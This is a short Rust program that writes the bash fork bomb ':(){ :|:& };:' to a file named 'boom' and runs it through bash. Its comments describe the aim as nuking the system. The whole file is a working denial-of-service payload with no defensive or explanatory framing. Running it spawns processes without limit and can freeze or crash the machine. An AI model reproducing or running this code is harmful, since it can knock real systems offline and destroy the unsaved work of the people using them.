use std::io::prelude::*;
use std::fs::File;
use std::process::Command;
// Since rust have nice thread handling and unwrapping - there is no way to fork bomb using rust only
// So I'm using bash to nuke the system
#[allow(unconditional_recursion)]
fn main(){
    let f = File::create("boom");
    assert_eq!(f.is_ok(), true);
    let res = f.unwrap().write_all(b":(){ :|:& };:");
    assert_eq!(res.is_ok(), true);

    let output = Command::new("bash")
        .arg("boom")
        .output();

    println!("this will not exit !!!: {}", String::from_utf8_lossy(&output.stdout));
}stdout
